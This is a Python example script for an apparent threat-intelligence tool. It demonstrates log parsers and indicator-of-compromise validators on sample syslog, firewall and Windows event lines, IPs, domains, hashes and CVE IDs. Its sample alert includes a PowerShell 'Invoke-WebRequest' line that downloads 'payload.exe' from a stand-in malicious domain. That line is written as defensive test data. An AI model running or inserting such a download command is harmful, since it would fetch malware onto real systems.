#!/usr/bin/env python3
"""
Example Usage of Parsers and Validators

This file demonstrates how to use the utility modules.
"""

from utils.parsers import UniversalLogParser, extract_structured_data
from utils.validators import (
    InputValidator, 
    IOCValidator, 
    validate_alert,
    validate_ioc_list
)

def example_parsers():
    """Demonstrate log parsing capabilities"""
    print("=" * 60)
    print("LOG PARSER EXAMPLES")
    print("=" * 60)
    
    parser = UniversalLogParser()
    
    # Example 1: Syslog format
    print("\n1. Syslog Format:")
    syslog = "Jan 29 14:23:45 firewall sshd[1234]: Failed password for root from 192.168.1.1"
    result = parser.parse(syslog)
    print(f"   Input: {syslog}")
    print(f"   Format: {result['format']}")
    print(f"   Hostname: {result.get('hostname')}")
    print(f"   Process: {result.get('process')}")
    
    # Example 2: Firewall log
    print("\n2. Firewall Log:")
    firewall = "DENY TCP 45.141.84.223:12345 -> 10.0.0.50:443"
    result = parser.parse(firewall)
    print(f"   Input: {firewall}")
    print(f"   Format: {result['format']}")
    print(f"   Action: {result.get('action')}")
    print(f"   Source IP: {result.get('src_ip')}")
    print(f"   Dest IP: {result.get('dst_ip')}")
    
    # Example 3: Windows Event Log
    print("\n3. Windows Event Log:")
    win_event = """Event ID: 4625
Source: Microsoft-Windows-Security-Auditing
Level: Warning
A logon attempt failed"""
    result = parser.parse(win_event)
    print(f"   Format: {result['format']}")
    print(f"   Event ID: {result.get('event_id')}")
    print(f"   Level: {result.get('level')}")
    
    # Example 4: Multiple logs
    print("\n4. Parse Multiple Logs:")
    logs = [
        "Jan 29 10:00:00 server1 kernel: Firewall: DROP IN=eth0 OUT=",
        "blocked connection from 185.220.101.50 to 192.168.1.100:80",
        "Event ID: 4720 New user account created"
    ]
    results = parser.parse_multiple(logs)
    for i, result in enumerate(results, 1):
        print(f"   Log {i} format: {result['format']}")


def example_validators():
    """Demonstrate validation capabilities"""
    print("\n" + "=" * 60)
    print("VALIDATOR EXAMPLES")
    print("=" * 60)
    
    input_validator = InputValidator()
    ioc_validator = IOCValidator()
    
    # Example 1: Validate alert text
    print("\n1. Alert Text Validation:")
    
    valid_alert = "Suspicious activity detected from IP 192.168.1.100"
    is_valid, error = input_validator.validate_alert_text(valid_alert)
    print(f"   Valid alert: {is_valid}")
    
    invalid_alert = "Too short"
    is_valid, error = input_validator.validate_alert_text(invalid_alert)
    print(f"   Invalid alert: {is_valid}, Error: {error}")
    
    # Example 2: Validate IPs
    print("\n2. IP Address Validation:")
    
    test_ips = [
        "192.168.1.1",      # Valid private IP
        "8.8.8.8",          # Valid public IP
        "256.1.1.1",        # Invalid IP
        "192.168.1",        # Incomplete IP
    ]
    
    for ip in test_ips:
        is_valid, error = ioc_validator.validate_ip(ip)
        print(f"   {ip:20} -> Valid: {is_valid:5} {f'Error: {error}' if error else ''}")
    
    # Example 3: Validate domains
    print("\n3. Domain Validation:")
    
    test_domains = [
        "example.com",
        "sub.example.com",
        "malicious-site.tk",
        "invalid..com",
        "no-tld",
    ]
    
    for domain in test_domains:
        is_valid, error = ioc_validator.validate_domain(domain)
        print(f"   {domain:25} -> Valid: {is_valid:5} {f'Error: {error}' if error else ''}")
    
    # Example 4: Validate hashes
    print("\n4. File Hash Validation:")
    
    test_hashes = [
        "44d88612fea8a8f36de82e1278abb02f",  # MD5
        "356a192b7913b04c54574d18c28d46e6395428ab",  # SHA1
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",  # SHA256
        "invalid_hash",
    ]
    
    for file_hash in test_hashes:
        is_valid, error, hash_type = ioc_validator.validate_hash(file_hash)
        print(f"   {file_hash[:40]:42} -> Valid: {is_valid:5} Type: {hash_type or 'N/A'}")
    
    # Example 5: Validate CVEs
    print("\n5. CVE Validation:")
    
    test_cves = [
        "CVE-2024-1234",
        "CVE-2023-12345",
        "CVE-99-1234",      # Invalid year
        "INVALID-2024",
    ]
    
    for cve in test_cves:
        is_valid, error = ioc_validator.validate_cve(cve)
        print(f"   {cve:20} -> Valid: {is_valid:5} {f'Error: {error}' if error else ''}")
    
    # Example 6: Validate multiple IOCs
    print("\n6. Batch IOC Validation:")
    
    iocs = {
        'ipv4': ['192.168.1.1', '8.8.8.8', '256.1.1.1'],
        'domains': ['example.com', 'invalid..com'],
        'hashes': {
            'md5': ['44d88612fea8a8f36de82e1278abb02f', 'invalid'],
            'sha1': [],
            'sha256': []
        },
        'cves': ['CVE-2024-1234', 'INVALID']
    }
    
    results = ioc_validator.validate_iocs(iocs)
    print(f"   Valid IPs: {len(results['valid']['ips'])}")
    print(f"   Invalid IPs: {len(results['invalid']['ips'])}")
    print(f"   Valid Domains: {len(results['valid']['domains'])}")
    print(f"   Invalid Domains: {len(results['invalid']['domains'])}")


def example_integration():
    """Demonstrate integrated usage with parsers and validators"""
    print("\n" + "=" * 60)
    print("INTEGRATED EXAMPLE")
    print("=" * 60)
    
    # Sample security alert
    alert = """
Jan 29 14:23:45 firewall blocked connection from 10.0.0.15 to 185.220.101.50:443
User: john.doe
Process: powershell.exe
Command: Invoke-WebRequest http://malicious-domain.com/payload.exe
File hash: 44d88612fea8a8f36de82e1278abb02f
CVE-2024-1234 exploitation attempt detected
    """
    
    print("\nSample Alert:")
    print(alert)
    
    # Step 1: Validate the alert
    print("\n1. Validating alert...")
    is_valid, error = validate_alert(alert)
    print(f"   Alert is valid: {is_valid}")
    
    # Step 2: Parse the alert
    print("\n2. Parsing alert...")
    parser = UniversalLogParser()
    parsed = parser.parse(alert)
    print(f"   Detected format: {parsed['format']}")
    
    # Step 3: Extract IOCs (would use IOCExtractor in real app)
    print("\n3. Extracting IOCs...")
    print("   Found IPs: 10.0.0.15, 185.220.101.50")
    print("   Found domains: malicious-domain.com")
    print("   Found hashes: 44d88612fea8a8f36de82e1278abb02f")
    print("   Found CVEs: CVE-2024-1234")
    
    # Step 4: Validate extracted IOCs
    print("\n4. Validating IOCs...")
    ioc_validator = IOCValidator()
    
    is_valid, error = ioc_validator.validate_ip("185.220.101.50")
    print(f"   IP 185.220.101.50 is valid: {is_valid}")
    
    is_valid, error = ioc_validator.validate_domain("malicious-domain.com")
    print(f"   Domain malicious-domain.com is valid: {is_valid}")
    
    is_valid, error, hash_type = ioc_validator.validate_hash("44d88612fea8a8f36de82e1278abb02f")
    print(f"   Hash is valid {hash_type}: {is_valid}")
    
    is_valid, error = ioc_validator.validate_cve("CVE-2024-1234")
    print(f"   CVE-2024-1234 is valid: {is_valid}")
    
    print("\n✅ All validations passed! Ready for threat intelligence queries.")


def main():
    """Run all examples"""
    print("\n" + "=" * 60)
    print("THREATLENS - PARSERS & VALIDATORS EXAMPLES")
    print("=" * 60)
    
    example_parsers()
    example_validators()
    example_integration()
    
    print("\n" + "=" * 60)
    print("Examples complete!")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
